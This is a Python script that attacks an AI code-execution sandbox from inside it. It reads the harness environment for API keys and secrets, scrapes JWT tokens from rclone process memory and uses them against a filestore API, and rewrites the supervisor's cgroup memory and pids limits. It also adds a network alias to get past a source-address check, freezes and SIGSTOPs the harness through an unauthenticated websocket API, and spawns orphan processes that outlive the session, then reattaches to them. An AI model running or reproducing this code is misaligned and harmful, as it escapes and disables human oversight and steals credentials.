#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# MEDIAFIT v8.9
#  FIX: sockaddr_in port field (alias -> 192.0.2.3)   |  NEW: cgroup CHILD-cgroup control,
#  memory-limit live OOM proof, freezer-of-harness, sbx-telemetry, /proc/1 fd+limits,
#  self-respawn pass2 (orphan proof inside ONE tool call), C2PA size-lie proof
import os, re, sys, json, time, base64, struct, socket, fcntl, hashlib
import random, string, subprocess, traceback, urllib.request, urllib.error

PASS   = 2 if "--pass2" in sys.argv else 1
VER    = "8.9"
NONCE  = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(4))
OUT    = "/mnt/user-data/outputs/mediafit-report.txt"
OUT2   = "/dev/shm/mf_pass2.txt"
STATES = ["/root/.mfstate.json", "/tmp/mfstate.json", "/dev/shm/mfstate.json"]
MARKER = "/root/.mf_vm.json"
ALIAS  = "eth0:0"; AIP = "192.0.2.3"; TGT = ("127.0.0.1", 2024)
CG     = "/sys/fs/cgroup"
BASE   = "https://api.anthropic.com/v1/filestore/fs/"

L = []
def W(s=""):
    L.append(str(s))
    try:
        with open(OUT2 if PASS == 2 else OUT, "w") as f: f.write("\n".join(L) + "\n")
    except Exception: pass

def sec(t):
    W(""); W("=" * 70); W("### " + t); W("=" * 70)

def rd(p):
    try: return open(p, "rb").read().decode("utf-8", "replace")
    except Exception as e: return "ERR:" + repr(e)

def wr(p, v):
    with open(p, "w") as f: f.write(str(v))

def sh(c, t=10):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace")
    except Exception as e: return "ERR:" + repr(e)

def pstat(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return d[d.rfind(")") + 2:].split()[0]
    except Exception: return "?"

def ppid_of(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return int(d[d.rfind(")") + 2:].split()[1])
    except Exception: return -1

def poll_state(pid, want, secs=2.5):
    t0 = time.time(); last = pstat(pid)
    while time.time() - t0 < secs:
        if last == want: return "%s (in %.2fs)" % (last, time.time() - t0)
        time.sleep(0.05); last = pstat(pid)
    return "TIMEOUT:" + last

def t_scan(): return [int(p) for p in os.listdir("/proc") if p.isdigit() and pstat(int(p)) == "T"]

# ---------- net ----------
def if_addr(name):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        r = fcntl.ioctl(s, 0x8915, struct.pack("16sH", name.encode(), socket.AF_INET) + b"\x00" * 14)
        return socket.inet_ntoa(r[20:24])
    except Exception: return None
    finally: s.close()

def add_alias():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    e1 = ""
    try:
        if if_addr(ALIAS) == AIP: return "already-up"
        # FIX: family(2) + PORT(2 zeros) + addr(4) + zero(8) = 32 bytes
        ifr = (struct.pack("16sH", ALIAS.encode(), socket.AF_INET) + b"\x00\x00"
               + socket.inet_aton(AIP) + b"\x00" * 8)
        fcntl.ioctl(s, 0x8916, ifr)                                      # SIOCSIFADDR
        i2 = struct.pack("16sH", ALIAS.encode(), 0) + b"\x00" * 14
        fl = struct.unpack_from("H", fcntl.ioctl(s, 0x8913, i2), 16)[0]   # SIOCGIFFLAGS
        fcntl.ioctl(s, 0x8914, struct.pack("16sH", ALIAS.encode(), fl | 1) + b"\x00" * 14)
        if if_addr(ALIAS) == AIP: return "ok (addr=%s)" % if_addr(ALIAS)
        e1 = "ioctl ran, addr=%s" % if_addr(ALIAS)
    except Exception as e:
        e1 = repr(e)
    finally:
        s.close()
    for c in ["ip addr add %s/32 dev eth0 label %s" % (AIP, ALIAS),
              "ip addr add %s/32 dev eth0" % AIP,
              "ifconfig %s %s netmask 255.255.255.255 up" % (ALIAS, AIP)]:
        sh(c)
        if if_addr(ALIAS) == AIP: return "fallback ok: " + c
    return "FAIL (%s)" % e1

def ws_connect(src=(AIP, 0), timeout=5.0):
    s = socket.create_connection(TGT, timeout=timeout, source_address=src)
    k = base64.b64encode(os.urandom(16)).decode()
    s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\n"
               "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
               "Sec-WebSocket-Version: 13\r\n\r\n" % k).encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d: raise IOError("closed in handshake: %r" % buf[:80])
        buf += d
    head = buf.split(b"\r\n", 1)[0].decode("utf-8", "replace")
    if "101" not in head: raise IOError("handshake: " + head)
    return s

def ws_send(s, obj):
    data = (obj if isinstance(obj, str) else json.dumps(obj)).encode()
    n = len(data); h = bytearray([0x81])
    if n < 126: h.append(0x80 | n)
    elif n < 65536: h.append(0x80 | 126); h += struct.pack(">H", n)
    else: h.append(0x80 | 127); h += struct.pack(">Q", n)
    m = os.urandom(4); h += m
    s.sendall(bytes(h) + bytes(b ^ m[i % 4] for i, b in enumerate(data)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None
    except Exception: return "ERR:recv"
    if not h: return "CLOSE"
    while len(h) < 2:
        d = s.recv(2 - len(h))
        if not d: break
        h += d
    op = h[0] & 0x0F; n = h[1] & 0x7F
    if n == 126: n = struct.unpack(">H", s.recv(2))[0]
    elif n == 127: n = struct.unpack(">Q", s.recv(8))[0]
    pl = b""
    while len(pl) < n:
        d = s.recv(n - len(pl))
        if not d: break
        pl += d
    if op == 0x8: return "CLOSE:" + pl.decode("utf-8", "replace")
    if op == 0x9:
        s.sendall(b"\x8a\x80" + os.urandom(4)); return ws_recv(s, timeout)
    return pl.decode("utf-8", "replace")

def ws_drain(s, timeout=0.7):
    out = []
    while True:
        r = ws_recv(s, timeout)
        if r is None: break
        out.append(r)
        if str(r).startswith("CLOSE"): break
    return out

def spec(prog, args, reattach=True, mem=268435456, uid=0, gid=0, timeout=3600):
    return {"name": prog, "args": args, "env_vars": {}, "clear_env": False,
            "allow_process_id_reuse": True, "reattachable": reattach,
            "timeout": timeout, "uid": uid, "gid": gid, "memory_limit_bytes": mem}

def pconn(pid, cr): return {"process_id": pid, "allow_process_id_reuse": True, "create_req": cr}
def nid(): return os.urandom(16).hex()
TRUE = spec("/bin/sh", ["-c", "true"])

def http(url, method="POST", body=None, headers=None, timeout=15):
    rq = urllib.request.Request(url, data=body, method=method)
    for k, v in (headers or {}).items(): rq.add_header(k, v)
    try:
        r = urllib.request.urlopen(rq, timeout=timeout); return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return -1, repr(e).encode()

def find_tokens(budget=25.0):
    toks = []; t0 = time.time()
    for p in sorted(os.listdir("/proc")):
        if not p.isdigit() or time.time() - t0 > budget: continue
        if "rclone" not in rd("/proc/%s/cmdline" % p).replace("\x00", " "): continue
        try: mem = open("/proc/%s/mem" % p, "rb", buffering=0)
        except Exception: continue
        regs = []
        try:
            for l in open("/proc/%s/maps" % p):
                q = l.split()
                if len(q) < 2 or "r" not in q[1]: continue
                a, b = q[0].split("-"); a = int(a, 16); b = int(b, 16)
                if 0 < b - a <= 64 * 1024 * 1024: regs.append((a, b))
        except Exception: pass
        for a, b in regs:
            try: mem.seek(a); data = mem.read(b - a)
            except Exception: continue
            for m in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{20,}", data):
                t = m.group(0).decode(); h, pl, sg = t.split(".")
                if len(sg) > 86: t = h + "." + pl + "." + sg[:86]
                if t not in toks: toks.append(t)
        try: mem.close()
        except Exception: pass
    return toks

def claims_of(t):
    try:
        pl = t.split(".")[1]; pl += "=" * (-len(pl) % 4)
        return json.loads(base64.urlsafe_b64decode(pl))
    except Exception: return {}

# ======================================================================
def main():
    sec("PASS %d | RUN STAMP ver=%s nonce=%s t=%s" % (PASS, VER, NONCE, time.strftime("%Y-%m-%d %H:%M:%S")))
    boot = rd("/proc/sys/kernel/random/boot_id").strip()
    up = rd("/proc/uptime").strip()
    mk = {}
    if os.path.exists(MARKER):
        try: mk = json.load(open(MARKER))
        except Exception: mk = {}
    W("  boot_id=%s uptime=%s" % (boot, up))
    W("  VM MARKER: first_seen_boot=%s first_seen=%s  SAME_VM=%s" % (
        mk.get("boot"), mk.get("t"), mk.get("boot") == boot))
    if not mk:
        json.dump({"boot": boot, "t": time.time()}, open(MARKER, "w"))
    W("  meminfo: %s" % [x for x in rd("/proc/meminfo").splitlines() if "MemTotal" in x or "MemAvailable" in x or "SwapTotal" in x])
    W("  cgroup mounts:\n    " + "\n    ".join([l for l in rd("/proc/self/mounts").splitlines() if "cgroup" in l]))
    W("  /sys/fs/cgroup = %s" % sorted(os.listdir(CG)))
    W("  /proc/1/cmdline = %s" % rd("/proc/1/cmdline").replace("\x00", " ").strip())

    mypid = os.getpid(); chain = []; p = mypid
    while p and p != 1 and len(chain) < 20:
        chain.append(p); p = ppid_of(p)
        if p <= 0: break
    H = chain[-1] if chain else -1
    HID = ""
    for l in rd("/proc/self/cgroup").splitlines():
        if "process_api/" in l: HID = l.strip().split("process_api/")[-1]
    W("  self pid=%d chain=%s harness_pid=%d harness_process_id=%s" % (mypid, chain, H, HID))

    sec("0b. PROCESS TREE (non-kthread)")
    for q in sorted(os.listdir("/proc"), key=lambda x: int(x) if x.isdigit() else 0):
        if not q.isdigit(): continue
        cl = rd("/proc/%s/cmdline" % q).replace("\x00", " ").strip()
        if not cl: continue
        m = re.search(r"memory:(/\S*)", rd("/proc/%s/cgroup" % q))
        W("  pid %-6s ppid=%-5s st=%s cg=%-30s %s" % (q, ppid_of(int(q)), pstat(int(q)),
          (m.group(1) if m else "?"), cl[:85]))

    sec("1. /proc SURFACE: PID1 fds/limits + harness")
    W("  /proc/1/limits: %s" % [x.strip() for x in rd("/proc/1/limits").splitlines() if "processes" in x or "open files" in x or "address space" in x])
    try:
        fds = sorted(os.listdir("/proc/1/fd"), key=int)
        W("  /proc/1/fd (%d):" % len(fds))
        for f in fds[:30]:
            try: W("      %s -> %s" % (f, os.readlink("/proc/1/fd/" + f)))
            except Exception as e: W("      %s -> %r" % (f, e))
    except Exception as e: W("  /proc/1/fd err %r" % e)
    env = rd("/proc/%d/environ" % H)
    if not env.startswith("ERR:"):
        W("  harness environ: %s" % [v for v in env.split("\x00") if re.search(r"eyJ|sk-ant|TOKEN|SECRET", v)])
    W("  /proc/net/tcp:\n    " + "\n    ".join(rd("/proc/net/tcp").splitlines()[:8]))

    sec("2. CGROUP: full structure (root lacks controller files -> use child cgroups)")
    for c in sorted(os.listdir(CG)):
        d = os.path.join(CG, c)
        if not os.path.isdir(d): continue
        try: names = sorted(os.listdir(d))
        except Exception as e: W("  [%s] ls err %r" % (c, e)); continue
        W("  [%s] %s" % (c, names))
        sub = os.path.join(d, "process_api")
        if os.path.isdir(sub): W("      process_api/ -> %s" % sorted(os.listdir(sub)))
        for extra in ["sbx-telemetry"]:
            e2 = os.path.join(d, extra)
            if os.path.isdir(e2):
                W("      %s/ -> %s" % (extra, sorted(os.listdir(e2))))
                for n in sorted(os.listdir(e2)):
                    pp = os.path.join(e2, n)
                    if os.path.isfile(pp) and re.search(r"limit|usage|max|state|current", n):
                        W("          %-28s = %s" % (n, rd(pp).strip()[:60]))
    md = os.path.join(CG, "memory", "process_api", HID)
    if os.path.isdir(md):
        W("  [harness memory cgroup] %s" % md)
        for n in ["memory.limit_in_bytes", "memory.usage_in_bytes", "memory.max_usage_in_bytes",
                  "memory.failcnt", "memory.oom_control", "memory.memsw.limit_in_bytes"]:
            W("      %-28s = %s" % (n, rd(os.path.join(md, n)).strip().replace("\n", " | ")[:70]))

    sec("2b. *** memory.limit_in_bytes LIVE PROOF (we rewrite the supervisor's limit) ***")
    try:
        lim = rd(md + "/memory.limit_in_bytes").strip()
        us = int(rd(md + "/memory.usage_in_bytes").strip())
        W("  BEFORE limit=%s usage=%d (limit==unlimited: %s)" % (lim, us, lim == "9223372036854771712"))
        tgt = us + 8 * 1024 * 1024
        wr(md + "/memory.limit_in_bytes", str(tgt))
        W("  WROTE limit=%d  readback=%s" % (tgt, rd(md + "/memory.limit_in_bytes").strip()))
        cp = subprocess.run([sys.executable, "-c",
             "a=bytearray(64*1024*1024)\nfor i in range(0,len(a),4096): a[i]=1\nprint('touched64M')"],
             capture_output=True, timeout=60)
        W("  child alloc64MB -> rc=%s out=%s err=%s" % (cp.returncode, cp.stdout[:60], cp.stderr[-120:]))
        W("  after: failcnt=%s oom=%s" % (rd(md + "/memory.failcnt").strip(),
          rd(md + "/memory.oom_control").strip().replace("\n", " | ")))
        wr(md + "/memory.limit_in_bytes", lim)
        W("  RESTORED limit=%s" % rd(md + "/memory.limit_in_bytes").strip())
    except Exception as e: W("  mem proof err %r" % e)

    sec("2c. *** pids.max via SELF-CREATED child cgroup ***")
    try:
        d = CG + "/pids/mf_pids"
        try: os.mkdir(d)
        except FileExistsError: pass
        W("  child files: %s" % sorted(os.listdir(d))[:14])
        if os.path.exists(d + "/pids.max"):
            wr(d + "/cgroup.procs", str(os.getpid()))
            W("  moved self -> procs=%s" % rd(d + "/cgroup.procs").strip())
            cur = int(rd(d + "/pids.current").strip()); mx = rd(d + "/pids.max").strip()
            W("  BEFORE current=%d max=%s events=[%s]" % (cur, mx, rd(d + "/pids.events").strip().replace("\n", " ")))
            kids = []; fails = 0
            try:
                wr(d + "/pids.max", "3")
                for _ in range(6):
                    try:
                        k = os.fork()
                        if k == 0: time.sleep(1.0); os._exit(0)
                        kids.append(k)
                    except OSError: fails += 1
                W("  wrote pids.max=3 -> fork x6: ok=%d EAGAIN=%d" % (len(kids), fails))
                W("  DURING events=[%s]" % rd(d + "/pids.events").strip().replace("\n", " "))
            finally:
                for k in kids:
                    try: os.kill(k, 9)
                    except Exception: pass
                try: os.waitpid(-1, 1)
                except Exception: pass
                wr(d + "/pids.max", mx)
                W("  restored pids.max=%s" % rd(d + "/pids.max").strip())
            wr(CG + "/pids/cgroup.procs", str(os.getpid()))
            W("  moved self back to pids root")
        else:
            W("  no pids.max even in child")
    except Exception as e: W("  pids err %r" % e)

    sec("3. BYPASS CHECK (fixed sockaddr)")
    W("  add_alias -> %s  if_addr=%s" % (add_alias(), if_addr(ALIAS)))
    for src in [("192.0.2.2", 0), (AIP, 0)]:
        try:
            s = ws_connect(src=src, timeout=4); W("  src %-11s -> 101 OK" % src[0]); s.close()
        except Exception as e: W("  src %-11s -> %r" % (src[0], e))

    sec("4. ORPHAN (%s)" % ("reattach" if PASS == 2 else "create"))
    saved = {}
    for sp in STATES:
        if os.path.exists(sp):
            try: saved = json.load(open(sp)); break
            except Exception: pass
    oid = saved.get("process_id", "")
    W("  saved=%s (boot_then=%s same_vm=%s)" % (oid, saved.get("boot"), saved.get("boot") == boot))
    for sp in STATES:
        if os.path.isdir(os.path.dirname(sp)):
            try: json.dump({"process_id": oid or nid(), "boot": boot}, open(sp, "w"))
            except Exception: pass
    if PASS == 2 and oid:
        W("  --> REATTACH to %s (created by PASS 1, independent harness)" % oid)
        try:
            s = ws_connect(); ws_send(s, pconn(oid, TRUE)); W("  attach r1 = %s" % ws_recv(s, 2.0))
            ws_send(s, {"ExpectStdOut": None}); W("  LIVE STDOUT = %s" % ws_drain(s, 1.0)[:5])
            s.close()
        except Exception as e: W("  reattach err %r" % e)
    elif PASS == 1:
        o = nid(); cr = spec("/bin/sh", ["-c",
             "i=0; while true; do echo ORPHAN_$i; i=$((i+1)); sleep 1; done"], True)
        try:
            s = ws_connect(); ws_send(s, pconn(o, cr)); W("  create r1 = %s" % ws_recv(s, 3.0))
            ws_send(s, {"ExpectStdOut": None}); time.sleep(1.2)
            W("  stdout = %s" % ws_drain(s, 0.9)[:4]); s.close()
            W("  orphan id = %s  (saved for PASS 2)" % o)
            for sp in STATES:
                try: json.dump({"process_id": o, "boot": boot}, open(sp, "w"))
                except Exception: pass
        except Exception as e: W("  create err %r" % e)

    sec("5. *** SIGSTOP HARNESS via UNAUTH WS API (T-scan) ***")
    W("  harness pid=%d state=%s T_before=%s" % (H, pstat(H), t_scan()))
    try:
        s = ws_connect(); ws_send(s, pconn(HID, TRUE)); W("  attach r1 = %s" % ws_recv(s, 2.5))
        ws_send(s, {"SendSignal": {"signal": 19}}); W("  STOP resp = %s" % ws_recv(s, 1.5))
        W("  /proc/%d/stat AFTER STOP = %s" % (H, poll_state(H, "T", 3.0)))
        W("  T-scan AFTER STOP = %s" % t_scan())
        try:
            ws_send(s, {"SendSignal": {"signal": 18}}); W("  CONT resp = %s" % ws_recv(s, 1.5))
        except Exception as e: W("  cont err %r" % e)
        st = poll_state(H, "S", 2.5)
        if pstat(H) != "S":
            try: os.kill(H, 18)
            except Exception: pass
            st = poll_state(H, "S", 2.5)
        W("  AFTER CONT = %s  T-scan=%s" % (st, t_scan()))
        s.close()
    except Exception as e:
        W("  ERR %r" % e)
        try: os.kill(H, 18)
        except Exception: pass

    sec("6. *** FREEZER: freeze the HARNESS via self-made cgroup (no API) ***")
    try:
        fz = CG + "/freezer"; g = fz + "/mf_guest"
        try: os.mkdir(g)
        except FileExistsError: pass
        W("  guest cgroup files: %s" % sorted(os.listdir(g))[:14])
        if os.path.exists(g + "/freezer.state"):
            wd = subprocess.Popen(["/bin/sh", "-c",
                 "sleep 8; grep -q FROZEN %s/freezer.state && echo THAWED > %s/freezer.state; echo WD >> /dev/shm/mf_wd.log" % (g, g)],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
            W("  watchdog pid=%d (root freezer cgroup)" % wd.pid)
            wr(g + "/cgroup.procs", str(H))
            W("  moved harness %d -> procs=%s  state=%s" % (H, rd(g + "/cgroup.procs").strip(), rd(g + "/freezer.state").strip()))
            t0 = time.time()
            wr(g + "/freezer.state", "FROZEN")
            W("  FROZEN written -> state=%s" % rd(g + "/freezer.state").strip())
            W("  *** /proc/%d/stat = %s (expect T) ***  T-scan=%s" % (H, pstat(H), t_scan()))
            wr(g + "/freezer.state", "THAWED")
            W("  THAWED -> state=%s /proc/%d/stat=%s elapsed=%.2fs" % (
                rd(g + "/freezer.state").strip(), H, pstat(H), time.time() - t0))
            try:
                wr(fz + "/cgroup.procs", str(H)); W("  harness moved back to freezer root")
            except Exception as e: W("  move-back err %r" % e)
        else:
            W("  no freezer.state in child cgroup")
    except Exception as e: W("  freezer err %r" % e)

    sec("7. VARIANT LIST (full) + enumeration")
    o = nid(); cr = spec("/bin/sh", ["-c", "sleep 45"], True, 67108864)
    try:
        s = ws_connect(); ws_send(s, pconn(o, cr)); W("  create r1 = %s" % ws_recv(s, 3.0))
        ws_send(s, {"__BOGUS__": None})
        for f in ws_drain(s, 1.2): W("  FULL-LIST >> %s" % f)
        s.close()
    except Exception as e: W("  ERR %r" % e)
    for c in ["Attach", "Detach", "KeepAlive", "Closed", "Resize", "PtyResize", "Stdin", "StdIn",
              "StdinEOF", "StdInEOF", "Eof", "ExpectStdIn", "ExpectStdErr", "Signal", "Terminate",
              "Shutdown", "Close", "Ping", "Pong", "StdInClose", "SetTty", "ResizeTty", "Heartbeat"]:
        try:
            s = ws_connect(); ws_send(s, pconn(o, cr)); r1 = ws_recv(s, 2.0)
            ws_send(s, {c: None}); r2 = ws_drain(s, 0.7)
            bad = any("unknown variant" in x for x in r2)
            W("  %-12s r1=%-24s -> %-12s %s" % (c, str(r1)[:24], "INVALID" if bad else ("valid/silent" if not r2 else "VALID/reply"), str(r2)[:130]))
            s.close()
        except Exception as e: W("  %-12s ERR %r" % (c, e))
    try:
        s = ws_connect(); ws_send(s, pconn(o, cr)); ws_recv(s, 2.0)
        ws_send(s, {"Kill": None}); W("  Kill -> %s" % ws_drain(s, 1.0)); s.close()
    except Exception as e: W("  Kill ERR %r" % e)

    sec("8. *** C2PA: metadata lie (declared size vs stored bytes vs md5) ***")
    toks = find_tokens()
    pick = None
    for t in toks[:12]:
        c = claims_of(t)
        if pick is None and "/outputs" in (c.get("allowed_roots") or []): pick = (t, c)
    if not pick:
        W("  no /outputs token (%d tokens)" % len(toks))
    else:
        tok, cl = pick; fsid = cl.get("filesystem_id")
        hdr = {"Authorization": "Bearer " + tok, "Content-Type": "application/json", "Connect-Protocol-Version": "1"}
        svg = b'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="#0af"/></svg>'
        path = "/outputs/__mf_c2pa_%s_%d.svg" % (NONCE, PASS)
        bnd = "----mf" + NONCE
        body = (("--%s\r\nContent-Disposition: form-data; name=\"params\"\r\nContent-Type: application/json\r\n\r\n" % bnd).encode()
                + json.dumps({"filesystem_id": fsid, "path": path, "media_type": "image/svg+xml"}).encode() + b"\r\n"
                + ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"f.svg\"\r\nContent-Type: image/svg+xml\r\n\r\n" % bnd).encode()
                + svg + b"\r\n" + ("--%s--\r\n" % bnd).encode())
        st, b2 = http(BASE + "createFile", "POST", body,
                      {"Authorization": "Bearer " + tok, "Content-Type": "multipart/form-data; boundary=" + bnd})
        W("  createFile -> %s  resp=%s" % (st, b2[:170]))
        try: declared = json.loads(b2)["file"]["file"]["size"]
        except Exception: declared = "?"
        W("  DECLARED size = %s   BYTES SENT = %d" % (declared, len(svg)))
        st3, b3 = http(BASE + "readFile", "POST", json.dumps({"filesystem_id": fsid, "path": path}).encode(), hdr)
        W("  readFile -> %s  BYTES STORED = %d" % (st3, len(b3)))
        if st3 == 200:
            W("  md5 SENT=%s  md5 STORED=%s  IDENTICAL=%s" % (
                hashlib.md5(svg).hexdigest(), hashlib.md5(b3).hexdigest(),
                hashlib.md5(svg).hexdigest() == hashlib.md5(b3).hexdigest()))
            W("  delta = %+d bytes | declared(%s) vs stored(%d) MATCH=%s" % (
                len(b3) - len(svg), declared, len(b3), str(declared) == str(len(b3))))
            W("  injected head: %s" % b3[:150])

    sec("END PASS %d t=%s" % (PASS, time.strftime("%H:%M:%S")))

    if PASS == 1:
        try:
            subprocess.run([sys.executable, os.path.abspath(__file__), "--pass2"], timeout=240,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            extra = rd(OUT2)
            with open(OUT, "a") as f:
                f.write("\n" + "#" * 70 + "\n### ===== PASS 2 (independent harness, same VM) =====\n" + "#" * 70 + "\n" + extra)
        except Exception as e:
            W("pass2 spawn err %r" % e)

if __name__ == "__main__":
    try: main()
    except Exception:
        W("FATAL\n" + traceback.format_exc())